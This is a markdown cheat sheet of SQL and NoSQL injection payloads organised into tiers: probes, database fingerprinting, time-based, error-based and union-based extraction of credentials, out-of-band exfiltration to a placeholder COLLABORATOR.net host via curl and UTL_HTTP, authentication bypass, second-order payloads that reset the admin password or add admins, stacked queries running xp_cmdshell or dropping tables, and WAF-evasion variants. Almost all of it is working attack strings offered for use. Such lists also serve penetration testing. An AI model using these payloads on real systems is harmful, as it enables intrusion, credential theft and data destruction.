# Master SQL Injection Payload Library

## TIER 1 — INITIAL PROBES (fire first, fast)

```
'
"
`
')
")
`)`
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
' OR 1=1#
1 AND 1=1--
1 AND 1=2--
' AND '1'='1
' AND '1'='2
1' AND '1'='1
1' AND '1'='2
```

## TIER 2 — DBMS FINGERPRINT PROBES

```sql
-- MySQL:
' AND SLEEP(0)--
' AND 1=BENCHMARK(1000000,SHA1('a'))--
' AND extractvalue(1,concat(0x7e,version()))--

-- MSSQL:
' AND 1=CONVERT(int,@@version)--
'; WAITFOR DELAY '0:0:0'--
' AND 1=@@version--

-- PostgreSQL:
' AND CAST(version() AS INT)=1--
'; SELECT pg_sleep(0)--

-- Oracle:
' AND 1=utl_inaddr.get_host_address('a')--
' UNION SELECT NULL FROM dual--

-- SQLite:
' AND 1=CAST(sqlite_version() AS INT)--
```

## TIER 3 — BOOLEAN CONFIRMATION

```sql
-- Positive (should behave normally):
' AND 1=1--
' AND 'a'='a
1 AND 1=1--
1 OR 1=0--

-- Negative (should differ):
' AND 1=2--
' AND 'a'='b
1 AND 1=2--
1 OR 1=1 AND 1=0--
```

## TIER 4 — TIME-BASED (per DBMS)

```sql
-- MySQL:
' AND SLEEP(3)--
' AND IF(1=1,SLEEP(3),0)--
' AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>64,SLEEP(3),0)--
1;SELECT SLEEP(3)--

-- MSSQL:
'; WAITFOR DELAY '0:0:3'--
' AND 1=1; WAITFOR DELAY '0:0:3'--
'; IF 1=1 WAITFOR DELAY '0:0:3'--
'; IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:3'--

-- PostgreSQL:
'; SELECT pg_sleep(3)--
' AND 1=1; SELECT pg_sleep(3)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- Oracle:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--
' AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<2 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3))--

-- SQLite:
' AND (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r LIMIT 5000000) SELECT COUNT(*) FROM r)=5000000--
```

## TIER 5 — ERROR-BASED (per DBMS)

```sql
-- MySQL extractvalue:
' AND extractvalue(1,concat(0x7e,version(),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--

-- MySQL updatexml:
' AND updatexml(1,concat(0x7e,version(),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND 1=2 UNION SELECT updatexml(2,concat(0x7e,database()),1)--

-- MySQL FLOOR/RAND:
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MSSQL CONVERT:
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysdatabases))--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--
' AND 1=CONVERT(int,(SELECT TOP 1 CAST(username+CHAR(58)+password AS NVARCHAR) FROM users))--

-- PostgreSQL CAST:
' AND CAST(version() AS INT)=1--
' AND CAST(current_database() AS INT)=1--
' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)=1--

-- Oracle XMLType:
' UNION SELECT XMLType('<x>'||(SELECT banner FROM v$version WHERE rownum=1)||'</x>'),NULL FROM dual--
' UNION SELECT UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1)),NULL FROM dual--
```

## TIER 6 — UNION-BASED

```sql
-- Column count detection:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   (increment until error → previous number = columns)

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   (increment until no error)

-- Print column position:
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Full extraction:
' UNION SELECT NULL,database(),NULL--
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,user(),NULL--
' UNION SELECT NULL,group_concat(table_name separator ','),NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,group_concat(column_name separator ','),NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users LIMIT 1 OFFSET 0--
' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users LIMIT 1 OFFSET 1--
```

## TIER 7 — OOB / OAST

```sql
-- MySQL DNS (needs FILE privilege):
' UNION SELECT LOAD_FILE(concat('\\\\\\\\',database(),'.COLLABORATOR.net\\\\a'))--
' UNION SELECT LOAD_FILE(concat(0x5c5c5c5c,(SELECT database()),0x2e4154544143.COLLABORATOR.net,0x5c61))--

-- MSSQL (xp_dirtree):
'; EXEC master..xp_dirtree '//'+@@version+'.COLLABORATOR.net/x'--
'; EXEC master..xp_dirtree '//COLLABORATOR.net/'+CAST(@@version AS VARCHAR)--

-- PostgreSQL:
'; COPY (SELECT current_database()) TO PROGRAM 'curl http://COLLABORATOR.net/'||current_database()--
'; COPY (SELECT '') TO PROGRAM 'nslookup COLLABORATOR.net'--

-- Oracle:
' UNION SELECT UTL_HTTP.REQUEST('http://COLLABORATOR.net/'||(SELECT banner FROM v$version WHERE rownum=1)),NULL FROM dual--
' UNION SELECT UTL_HTTP.REQUEST('http://COLLABORATOR.net/'||(SELECT username FROM all_users WHERE rownum=1)),NULL FROM dual--
' AND 1=2 UNION SELECT UTL_HTTP.REQUEST('http://COLLABORATOR.net/'),NULL FROM dual--
```

## TIER 8 — AUTH BYPASS

```sql
admin'--
admin'#
admin'/*
' OR 1=1--
' OR '1'='1
' OR 1=1#
" OR 1=1--
') OR ('1'='1
') OR 1=1--
' OR 1=1 LIMIT 1--
' OR '1'='1'--
'='
'LIKE'
'=''='
''='
admin' OR '1'='1'--
' UNION SELECT 1,2--
' UNION SELECT 1,'admin',3--
' UNION SELECT NULL,NULL,NULL--
```

## TIER 9 — SECOND-ORDER PAYLOADS (store in profile fields)

```sql
-- Username field payloads to store:
admin'--
test' UNION SELECT NULL,password,NULL FROM users--
a'; UPDATE users SET password='hacked' WHERE username='admin'--
a' OR 1=1--
attacker'; INSERT INTO admins(username,password) VALUES('evil','evil')--
referral'; DROP TABLE sessions--
' AND SLEEP(5)--
' AND extractvalue(1,concat(0x7e,version()))--
```

## TIER 10 — STACKED QUERIES

```sql
-- MySQL (rare, needs multi_statements=true):
'; SELECT SLEEP(3)--
'; INSERT INTO users VALUES('admin2','pass')--

-- MSSQL (most common stacked):
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; IF 1=1 SELECT 1--

-- PostgreSQL:
'; SELECT pg_sleep(3)--
'; COPY (SELECT '') TO PROGRAM 'id'--

-- SQLite:
'; DROP TABLE users--
'; CREATE TABLE evil(x TEXT)--
```

## TIER 11 — NOSQL PAYLOADS

```
-- GET param operator injection:
[$ne]=x
[$gt]=
[$regex]=.*
[$where]=return+true
[$in][]=admin&[$in][]=root

-- JSON body:
{"$ne": null}
{"$gt": ""}
{"$regex": ".*"}
{"$where": "return true"}
{"$in": ["admin","root"]}
{"$exists": true}
{"$not": {"$eq": "invalid"}}
```

## TIER 12 — WAF BYPASS COMBO PAYLOADS

```sql
-- Cloudflare bypass:
%27%20UNION/**/SELECT/**/NULL,NULL--
'/**/UNION/**/SELECT/**/version()--
' /*!UNION*/ /*!SELECT*/ version(),NULL--

-- Generic bypass combos:
'%09UNION%09SELECT%09NULL,NULL--
'+UNION+ALL+SELECT+NULL,NULL--
'/*comment*/UNION/*comment*/SELECT/*comment*/NULL,NULL--
'%0AUNION%0ASELECT%0ANULL,NULL--
' uNiOn sElEcT nUlL,nUlL--
'/*!50000UNION*//*!50000SELECT*/NULL,NULL--

-- Double encode:
%2527%2520UNION%2520SELECT%2520NULL,NULL--

-- CHAR combo:
' UNION SELECT CHAR(118,101,114,115,105,111,110,40,41),NULL--   -- version()
```

## QUICK HEADER INJECTION TEST SET

```
# Add each to respective header and test:
User-Agent: ' AND SLEEP(3)--
Referer: ' AND SLEEP(3)--
X-Forwarded-For: ' AND SLEEP(3)--
Cookie: session=value' AND SLEEP(3)--
X-Real-IP: 1.1.1.1' AND SLEEP(3)--
Accept-Language: en' AND SLEEP(3)--
X-Request-ID: ' AND SLEEP(3)--
```
